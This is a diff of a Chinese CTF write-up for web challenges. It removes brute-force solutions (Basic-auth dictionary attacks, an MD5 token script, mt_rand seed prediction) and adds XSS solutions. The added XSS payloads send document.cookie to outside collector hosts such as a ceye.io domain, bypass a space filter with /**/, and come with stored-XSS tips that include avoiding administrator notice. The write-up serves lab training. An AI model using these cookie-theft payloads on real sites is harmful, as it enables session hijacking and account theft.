@@ -2,192 +2,6 @@
 
 **Web方向主打的就是一个经验积累。**
 
-## 爆破
-
-### web21
-
-启动靶机，进入环境，发现要登陆
-
-先随便输入点什么进去，抓包，发现多了一行信息
-
-```
-Authorization: Basic MTIzNDU2OjEyMzQ1Ng==
-```
-
-将后面的编码进行解密后发现是123456:123456，这正是我刚刚输入进去的用户名:密码组合。
-
-接下来对其进行爆破
-
-payloadtype选Custom iterrator，position1填admin，position2填: ,position3导入字典
-
-将字典导入后，记得base64编码
-
-最后会得到一个状态为200的结果，重放它。
-
-得到flag
-
-![](.\爆破\图片\web21.png)
-
-
-
-### web22
-
-爆破子域名，Maltego等工具随便用一个就是了
-
-
-
-### web23
-
-首先，他需要爆破
-
-```
-<?php
-
-/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-03 11:43:51
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-03 11:56:11
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/
-error_reporting(0);
-
-include('flag.php');
-if(isset($_GET['token'])){
-    $token = md5($_GET['token']);
-    if(substr($token, 1,1)===substr($token, 14,1) && substr($token, 14,1) ===substr($token, 17,1)){
-        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){
-            echo $flag;
-        }
-    }
-}else{
-    highlight_file(__FILE__);
-
-}
-?>
-
-```
-
-
-
-照葫芦画瓢写个爆破脚本
-
-```
-<?php
-    for ($i = 1; $i <= 5000; $i++){
-        $token = md5($i);
-        if (substr($token, 1, 1) === substr($token, 14, 1) && substr($token, 14, 1) === substr($token, 17, 1)) {
-            if((intval(substr($token, 1,1)) + intval(substr($token, 14,1)) + substr($token, 17,1)) / substr($token, 1,1) === intval(substr($token, 31,1))){
-                echo $i;
-            }
-            }
-        }
-?>
-```
-
-
-
-将其执行后显示的结果为422，这就是我们需要的值
-
-payload:?token=422
-
-获得flag
-
-![](.\爆破\图片\web23.png)
-
-### web24
-
-先看源代码：
-
-```
-<?php
-
-/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-03 13:26:39
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-03 13:53:31
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/
-
-error_reporting(0);
-include("flag.php");
-if(isset($_GET['r'])){
-    $r = $_GET['r'];
-    mt_srand(372619038);
-    if(intval($r)===intval(mt_rand())){
-        echo $flag;
-    }
-}else{
-    highlight_file(__FILE__);
-    echo system('cat /proc/version');
-}
-```
-
-代码中包含了flag.php，并接受了一个名为r的GET请求，接下来就是随机数的计算，如果随机数生成相等就给flag，没有就给你系统版本号。
-
-编写爆破脚本
-
-```
-<?php
-        echo mt_srand(372619038);
-?>
-```
-
-payload:?r=1155388967
-
-
-
-### web25
-
-```
-<?php
-
-/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-03 13:56:57
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-03 15:47:33
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/
-
-
-error_reporting(0);
-include("flag.php");
-if(isset($_GET['r'])){
-    $r = $_GET['r'];
-    mt_srand(hexdec(substr(md5($flag), 0,8)));
-    $rand = intval($r)-intval(mt_rand());
-    if((!$rand)){
-        if($_COOKIE['token']==(mt_rand()+mt_rand())){
-            echo $flag;
-        }
-    }else{
-        echo $rand;
-    }
-}else{
-    highlight_file(__FILE__);
-    echo system('cat /proc/version');
-}
-```
-
-需要一个rand，使它的值和随机值相等，若名为token的cookie等于两次随机数之和。就给flag.
-
-需要使用php_mt_seed推断种子。
-
-### web26
-
-
-
 ## 命令执行
 
 **贴出的源代码均已去掉注释，太影响排版了**
@@ -2501,10 +2315,6 @@ f=1&m=2&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfu
 
 
 
-### web263
-
-
-
 ## XSS
 
 > document.cookie							用于js获取当前网页的cookie值
@@ -2610,4 +2420,82 @@ img.src="http://hi8y3b.ceye.io/"+document.cookie;
 ![](.\XSS\图片\web319.png)
 
 
+
+
+
+### web320
+
+不知道过滤了什么，一个个试。
+
+```
+document.cookie">
++document.cookie">
+xss='+document.cookie">
+='http://[ip]/xss.php?xss='+document.cookie">
+="document.location.href='http://[ip]/xss.php?xss='+document.cookie">
+onload="document.location.href='http://[ip]/xss.php?xss='+document.cookie">
+```
+
+以上这些都是能够正常上传的，但再加上前面的一个空格就不行了，从而可知过滤的是空格
+
+替换方法还是有的：`tab、/**/`
+
+payload:
+
+```
+<body/**/onload="window.open('http://we1wmh.ceye.io/'+document.cookie)"></body>
+```
+
+结果：
+
+```
+{"meta": {"code": 201, "message": "HTTP Record Insert Success"}}
+```
+
+![](.\XSS\图片\web320.png)
+
+
+
+### web321-326
+
+```
+<body/**/onload="window.open('http://we1wmh.ceye.io/'+document.cookie)"></body>
+```
+
+过滤了XSS，但我没有用过。
+
+![](.\XSS\图片\web321.png)
+
+
+
+### 
+
+### web327(VPS)
+
+现在开始，学习存储型XSS
+
+> 嵌入到web页面的恶意HTML会被存储到应用服务器端，简而言之就是会被存储到数据库（日志等也可），等用户打开页面时，会继续执行恶意代码，能够持续的攻击用户。
+>
+> 如何操作存储型XSS： 嵌入到web页面的恶意代码被存储到服务器上，例如在注册时候将用户昵称设置为XSS恶意代码，那么访问某些页面会显示用户名的时候就会触发恶意代码。
+>
+> JS属于前端代码，如果植入恶意代码成功，JS代码是不会显示出来的。
+>
+> 存储型XSS与反射型XSS的区别： 存储型存入数据库中，可持续时间长，而反射型持续时间短，仅对本次访问有影响，反射型一般要配合社工。
+>
+> 存储型XSS可以通过弹窗验证，不过不建议，会破坏网站结构，引起管理员的主意。
+>
+> 存储型XSS可能出现的位置：
+> （1）用户注册
+> （2）留言板
+> （3）上传文件的文件名处
+> （4）管理员可见的报错信息
+> （5）在线聊天框
+> （6）客服
+> （7）问题反馈区
+> （8）邮件信箱
+> 理论上，见框就插。
+
+```
+<body/**/onload="document.location.herf='http://we1wmh.ceye.io/'+document.cookie"></body>
+```
 
